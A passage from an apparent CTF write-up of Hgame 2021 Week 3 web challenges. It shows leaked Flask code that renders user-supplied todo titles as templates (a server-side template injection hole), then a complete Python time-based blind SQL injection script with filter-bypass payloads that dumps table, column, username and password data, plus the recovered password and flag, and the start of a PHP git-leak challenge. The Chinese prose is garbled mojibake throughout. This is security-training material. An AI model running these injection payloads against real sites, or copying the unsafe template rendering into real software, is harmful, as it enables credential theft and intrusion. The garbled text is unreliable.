punctuation">(</span><span class="token string">'You have DELETE a todo list'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'You DO NOT have permission to delete this todo'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'show_todo_list'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/view/&lt;int:id&gt;'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">view_todo_list</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_id <span class="token operator">=</span> TodoList<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first_or_404<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>user_id    <span class="token keyword">if</span> <span class="token punctuation">(</span>user_id <span class="token operator">==</span> current_user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            todo <span class="token operator">=</span> TodoList<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first_or_404<span class="token punctuation">(</span><span class="token punctuation">)</span>            s <span class="token operator">=</span> render_template<span class="token punctuation">(</span><span class="token string">'view.html'</span><span class="token punctuation">,</span> todo<span class="token operator">=</span>todo<span class="token punctuation">)</span>            s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"lza9veb5WmH367fcuUyn"</span><span class="token punctuation">,</span> todo<span class="token punctuation">.</span>title<span class="token punctuation">)</span>            t <span class="token operator">=</span> Template<span class="token punctuation">(</span>s<span class="token punctuation">)</span>            r <span class="token operator">=</span> t<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'hgame'</span> <span class="token keyword">in</span> r<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token string">'emagh'</span> <span class="token keyword">in</span> r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                r <span class="token operator">=</span> <span class="token string">'Stop!!!'</span>                r <span class="token operator">=</span> <span class="token string">'Stop!!!'</span>            <span class="token keyword">return</span> r        <span class="token keyword">except</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"Something went wrong!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'You DO NOT have permission to view this todo'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'show_todo_list'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/modify/&lt;int:id&gt;'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">modify_todo_list</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_id <span class="token operator">=</span> TodoList<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first_or_404<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>user_id    <span class="token keyword">if</span> <span class="token punctuation">(</span>user_id <span class="token operator">==</span> current_user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>            todolist <span class="token operator">=</span> TodoList<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first_or_404<span class="token punctuation">(</span><span class="token punctuation">)</span>            form <span class="token operator">=</span> TodoListForm<span class="token punctuation">(</span><span class="token punctuation">)</span>            form<span class="token punctuation">.</span>title<span class="token punctuation">.</span>data <span class="token operator">=</span> todolist<span class="token punctuation">.</span>title            form<span class="token punctuation">.</span>status<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>todolist<span class="token punctuation">.</span>status<span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'modify.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            form <span class="token operator">=</span> TodoListForm<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                todolist <span class="token operator">=</span> TodoList<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first_or_404<span class="token punctuation">(</span><span class="token punctuation">)</span>                todolist<span class="token punctuation">.</span>title <span class="token operator">=</span> form<span class="token punctuation">.</span>title<span class="token punctuation">.</span>data                todolist<span class="token punctuation">.</span>status <span class="token operator">=</span> form<span class="token punctuation">.</span>status<span class="token punctuation">.</span>data                db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                flash<span class="token punctuation">(</span><span class="token string">'You have MODIFY a todolist'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flash<span class="token punctuation">(</span>form<span class="token punctuation">.</span>errors<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'You DO NOT have permission to modify this todo'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'show_todo_list'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        pswd <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">+</span> SALT<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>pswd<span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> password<span class="token operator">=</span>pswd<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user<span class="token punctuation">:</span>            login_user<span class="token punctuation">(</span>user<span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">'You have logged in!'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'show_todo_list'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        pswd <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">+</span> SALT<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>pswd<span class="token punctuation">)</span>        newuser <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> password<span class="token operator">=</span>pswd<span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>newuser<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>            flash<span class="token punctuation">(</span><span class="token string">'You have registered!'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Username Exists'</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    flash<span class="token punctuation">(</span><span class="token string">'You have logout!'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_manager<span class="token punctuation">.</span>user_loader</span><span class="token keyword">def</span> <span class="token function">load_user</span><span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>æœç„¶æ˜¯æ£€æŸ¥æ¸²æŸ“åçš„ç»“æœé‡Œæ˜¯å¦æœ‰ <code>hgame</code> æˆ–è€… <code>emagh</code>ï¼Œæœ‰çš„è¯å°±ç›´æ¥è¿”å› <code>Stop!!!</code>ã€‚</p><p>å±…ç„¶æœ‰ä¸ª MySQL æ•°æ®åº“ï¼Œå˜¿å˜¿ä¿¡æ¯éƒ½æœ‰äº†ã€‚</p><h3 id="Liki-Jail"><a href="#Liki-Jail" class="headerlink" title="Liki-Jail"></a>Liki-Jail</h3><blockquote><p>æ¼«é•¿çš„è¿½æ•ç»“æŸäº†ï¼Œä½œæ¶å¤šç«¯çš„ Switch è¢«è­¦å®˜ Liki æ‰æ‹¿å½’æ¡ˆï¼Œå…³æŠ¼åœ¨ç¦»å¥‡ç›‘ç‹±<br> ä¸è¿‡ Switch å¥½åƒæœ‰ç€ä¸å¯å‘Šäººçš„ç§˜å¯†ï¼Œæœ‰ç€å¿…é¡»è¦å®Œæˆçš„äº‹æƒ…ï¼Œä»–å¿…é¡»è¦é€ƒç¦»ç›‘ç‹±<br> ä¸å·§çš„æ˜¯ç›‘ç‹±ç®¡ç†ç³»ç»Ÿåˆšå¥½æ­£åœ¨ç»´æŠ¤ï¼Œåªæœ‰ç®¡ç†å‘˜å¯ä»¥ç™»å½•ç³»ç»Ÿï¼Œè¯¥æ€ä¹ˆåŠå‘¢â€¦â€¦</p><p><a href="https://jailbreak.liki.link/">https://jailbreak.liki.link/</a> </p></blockquote><p>è¿‡æ»¤äº† ç©ºæ ¼ <code>-</code> <code>'</code> <code>"</code> <code>=</code></p><p>ç”¨ <code>\</code> è½¬ä¹‰æ‰å¼•å·ï¼Œè¯•äº†è¯• <code>username=\</code>, <code>password=/**/Or/**/sleep(10)#</code> æœç„¶èƒ½å¤Ÿ sleepã€‚</p><p>äºæ˜¯å°±æ˜¯ <strong>åŸºäºæ—¶é—´çš„ç›²æ³¨</strong> äº†ã€‚</p><p>ç„¶ååˆæ˜¯ SQL æ³¨å…¥ç¯èŠ‚ã€‚</p><p><strong>Exp:</strong></p><p>æ³¨æ„ <code>Content-Type</code> è¦åŠ ä¸Š <code>application/x-www-form-urlencoded</code>ï¼Œä¸ç„¶ä¹ˆå¾—ååº”ã€‚</p><p><code>=</code> ç”¨ <code>like</code> ç»•è¿‡ï¼Œä½†æ˜¯ <code>like</code> é»˜è®¤ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥éœ€è¦ <code>like binary</code>.</p><p>ç©ºæ ¼ç”¨ <code>/**/</code> ç»•è¿‡ã€‚</p><p>MySQL é‡Œå«æœ‰ç‰¹æ®Šå­—ç¬¦å¯ä»¥ç”¨ åå¼•å·åŒ…èµ·æ¥ï¼Œå¦‚ <code>(`blal@b@la`)</code>ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span><span class="token triple-quoted-string string">"""æ—¶é—´ç›²æ³¨è„šæœ¬MiaoTony"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlencodeheader <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"https://jailbreak.liki.link/"</span><span class="token punctuation">,</span>    <span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"jailbreak.liki.link"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">get_len</span><span class="token punctuation">(</span>password<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># è·å–æ•°æ®åº“é•¿åº¦</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start get length..."</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token string">"https://jailbreak.liki.link/login.php"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        payload<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\"</span>        payload<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> password<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token operator">=</span>i<span class="token punctuation">)</span>        payload <span class="token operator">=</span> urlencode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token comment"># print(payload)</span>        startTime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>        <span class="token comment"># print(r.text)</span>        <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> startTime <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"length:"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_name</span><span class="token punctuation">(</span>password<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> length<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># è·å–æ•°æ®åº“å</span>    url <span class="token operator">=</span> <span class="token string">"https://jailbreak.liki.link/login.php"</span>    name <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">'...'</span><span class="token punctuation">)</span>            s <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>            payload<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\"</span>            payload<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> password<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token operator">=</span>j<span class="token punctuation">,</span> s<span class="token operator">=</span>s<span class="token punctuation">)</span>            payload <span class="token operator">=</span> urlencode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            <span class="token comment"># print(payload)</span>            <span class="token comment"># payload = r"username=%5C&amp;password=%2F**%2FoR%2F**%2Fif%28length%28database%28%29%29likE%2F**%2F9%2Csleep%283%29%2C1%29%23"</span>            startTime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>            <span class="token comment"># print(r.text)</span>            <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> startTime <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>                name <span class="token operator">+=</span> i                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'====&gt;'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># db_len = "/**/oR/**/if(length(database())likE/**/{i},sleep(1),1)#"</span>    <span class="token comment"># get_len(db_len)</span>    <span class="token comment"># # 9</span>    <span class="token comment"># db_name = "/**/oR/**/if(substr(database(),{j},1)liKe/**/{s},sleep(1),1)#"</span>    <span class="token comment"># get_name(db_name, 9)</span>    <span class="token comment"># # week3sqli</span>    <span class="token comment"># table_len = "/**/oR/**/if((seleCt/**/lenGth(table_name)liKe/**/{i}/**/fRom/**/information_schema.tables/**/wHere/**/table_schema/**/liKe/**/database()/**/limit/**/0,1),sleep(1),1)#"</span>    <span class="token comment"># get_len(table_len)</span>    <span class="token comment"># # 5</span>    <span class="token comment"># table_name = "/**/oR/**/if((seLect/**/subStr(table_name,{j},1)liKe/**/{s}/**/fRom/**/information_schema.tables/**/wHere/**/table_schema/**/liKe/**/database()/**/limIt/**/0,1),sleep(1),1)#"</span>    <span class="token comment"># get_name(table_name, 5)</span>    <span class="token comment"># # u5ers</span>    <span class="token comment"># column_len = "/**/oR/**/if((seleCt/**/lenGth(column_name)liKe/**/{i}/**/fRom/**/information_schema.columns/**/wHere/**/table_name/**/liKe/**/0x7535657273/**/limit/**/0,1),sleep(1),1)#"</span>    <span class="token comment"># get_len(column_len)</span>    <span class="token comment"># # 8</span>    <span class="token comment"># column_name = "/**/oR/**/if((seLect/**/subStr(column_name,{j},1)liKe/**/{s}/**/fRom/**/information_schema.columns/**/wHere/**/table_name/**/liKe/**/0x7535657273/**/limIt/**/1,1),sleep(1),1)#"</span>    <span class="token comment"># get_name(column_name, 8)</span>    <span class="token comment"># # usern@me, p@ssword</span>    <span class="token comment"># username_len = "/**/oR/**/if((seLect/**/lenGth(`usern@me`)liKe/**/{i}/**/fRom/**/u5ers/**/lImit/**/0,1),sleep(1),1)#"</span>    <span class="token comment"># get_len(username_len)</span>    <span class="token comment"># # 5</span>    <span class="token comment"># password_len = "/**/oR/**/if((seLect/**/lenGth(`p@ssword`)liKe/**/{i}/**/fRom/**/u5ers/**/lImit/**/0,1),sleep(1),1)#"</span>    <span class="token comment"># get_len(password_len)</span>    <span class="token comment"># # 24</span>    <span class="token comment"># username = "/**/oR/**/if((seLect/**/subStr(`usern@me`,{j},1)liKe/**/binary/**/{s}/**/fRom/**/u5ers/**/limIt/**/0,1),sleep(1),1)#"</span>    <span class="token comment"># get_name(username, 5)</span>    <span class="token comment"># # admin</span>    password <span class="token operator">=</span> <span class="token string">"/**/oR/**/if((seLect/**/subStr(`p@ssword`,{j},1)liKe/**/binary/**/{s}/**/fRom/**/u5ers/**/limIt/**/0,1),sleep(1),1)#"</span>    get_name<span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span>    <span class="token comment"># sOme7hiNgseCretw4sHidd3n</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æœ€åç™»å½•æ‹¿åˆ° flagã€‚</p><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210218220834339.png"></p><p><code>hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}</code></p><h3 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h3><blockquote><p>r4uåè¿äº†ï¼r4uæ²¡å‡ºå¤•å’Œå¹´ï¼r4uè‡ªé—­äº†ï¼r4uå†™äº†ä¸ªæŠ½å¡æ¨¡æ‹Ÿå™¨æƒ³è¦è¯æ˜è‡ªå·±ä¸æ˜¯éé…‹ï¼Œè¿™ä¸€åˆ‡éƒ½æ˜¯é¹°è§’çš„é”™ã€‚r4uç”¨gitéƒ¨ç½²åˆ°äº†è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œç„¶è€Œè¿™ä¸€åˆ‡éƒ½è¢«å¤§é»‘å®¢likiçœ‹åœ¨äº†çœ¼é‡Œã€‚ flagä½äºç½‘ç«™æ ¹ç›®å½•flag.phpä¸­</p><p><a href="http://84f327c77d.arknights.r4u.top/">http://84f327c77d.arknights.r4u.top</a> </p></blockquote><p>å¥½è€¶ï¼Œ<strong>æ˜¯ git æ³„éœ²ï¼</strong></p><p>å…ˆæŠŠæºç æ‹‰ä¸‹æ¥ã€‚</p><p><code>index.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"simulator.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$simulator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Simulator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cards</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"draw"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$cards</span> <span class="token operator">=</span> <span class="token variable">$simulator</span><span class="token operator">-&gt;</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"draw"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Arknights<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token 